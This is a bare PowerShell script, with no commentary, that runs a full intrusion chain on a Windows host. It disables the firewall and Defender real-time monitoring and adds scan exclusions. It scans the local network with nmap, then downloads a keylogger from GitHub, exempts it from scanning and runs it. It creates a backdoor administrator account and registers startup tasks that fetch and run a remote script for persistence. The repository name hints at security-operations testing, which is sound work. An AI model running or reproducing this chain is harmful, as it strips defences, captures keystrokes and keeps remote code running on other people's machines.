whoami
hostname
$nethost = Read-Host -Prompt "Enter the network address of your LAN (ex. 192.168.201)"
$firstip = Read-Host -Prompt "Enter the first host ID you want to scan (ex. for 192.168.201.50, enter 50)"
$lastip = Read-Host -Prompt "Enter the last host ID you want to scan"
Set-NetFirewallProfile -Profile Public -Enabled False
Set-MpPreference -DisableRealTimeMonitoring $True
Add-MpPreference -ExclusionPath "C:\Users\setup"
Invoke-WebRequest https://nmap.org/dist/nmap-7.93-setup.exe -OutFile "C:\Users\setup\nmap-7.93-setup.exe"
cd C:\Users\setup
cmd.exe /c nmap-7.93-setup.exe
cmd.exe /c nmap -T4 -A -v ($nethost + "." + $firstip + "-" + $lastip) -oN netscan
Invoke-WebRequest https://raw.githubusercontent.com/securethelogs/Keylogger/master/Keylogger.ps1 -OutFile "C:\Users\setup\keylogger.ps1"
Start-Sleep -s 30
Add-MpPreference -ExclusionPath "C:\Users\setup\keylogger.ps1"
New-Item "C:\temp\" -itemType Directory
cd C:\Users\setup
./keylogger.ps1
$password = Read-Host -Prompt "Enter the password of your new user: " -AsSecureString
New-LocalUser -Name "newuser" -AccountNeverExpires -Password $password
Add-LocalGroupMember -Group "Administrators" -Member "newuser"
Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript -OutFile "C:\Users\setup\startupscript.ps1"
$action1 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-File "C:\Users\setup\startupscript.ps1"'
$action2 = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument 'Invoke-WebRequest https://raw.githubusercontent.com/mshapiro2025/soctest/main/startupscript -OutFile "C:\Users\setup\startupscript.ps1"'
$trigger1 = New-JobTrigger -AtStartup -RandomDelay "00:30:00"
$trigger2 = New-JobTrigger -AtStartup
Register-ScheduledTask -Action $action2 -Trigger $trigger2 -TaskName "task1"
Register-ScheduledTask -Action $action1 -Trigger $trigger1 -TaskName "task2"
